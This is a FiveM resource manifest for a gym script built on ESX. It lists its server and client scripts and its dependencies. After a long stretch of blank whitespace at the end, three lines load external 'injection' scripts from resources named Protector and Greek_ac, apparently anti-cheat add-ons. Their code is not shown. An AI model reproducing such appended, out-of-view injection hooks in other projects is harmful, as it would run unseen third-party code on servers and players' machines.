resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'Full gym for Fivem'

version '1.0.0'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'config.lua',
	'server/main.lua',
	'locales/en.lua',
}

client_scripts {
	'@es_extended/locale.lua',
	'config.lua',
	'client/main.lua',
	'locales/en.lua',
}

dependencies {
	'es_extended',
	'esx_billing'
}










server_script "@Protector/Server/injection.lua"


client_script "@Greek_ac/client/injections.lua"
server_script "@Greek_ac/server/injections.lua"